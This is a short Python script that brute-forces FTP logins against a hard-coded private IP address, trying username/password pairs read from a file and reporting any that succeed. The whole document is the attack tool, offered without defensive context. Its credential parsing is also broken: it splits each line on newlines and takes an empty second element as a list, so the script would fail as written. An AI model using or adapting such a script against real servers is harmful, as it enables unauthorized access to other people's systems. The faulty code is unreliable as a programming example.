import ftplib

def ftpbrute(host, passuse):
    try:
        fp = open(passuse, 'r')
    except:
        print("[-]" + passuse + " file does not exist")
        return
    for line in fp.readlines():
        username = line.split('\n')[0]
        password = line.split('\n')[1].split('\n')
        print("[+]Trying " + username + "/" + password)
        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(username, password)
            print("[+] Login succeeded with " + username + "/" + password)
            ftp.quit()
            exit(0)
        except:
            pass
    print("[-] Password is not in the list")

host = "192.168.29.196"
passusefile = "passuse.txt"
ftpbrute(host, passusefile)
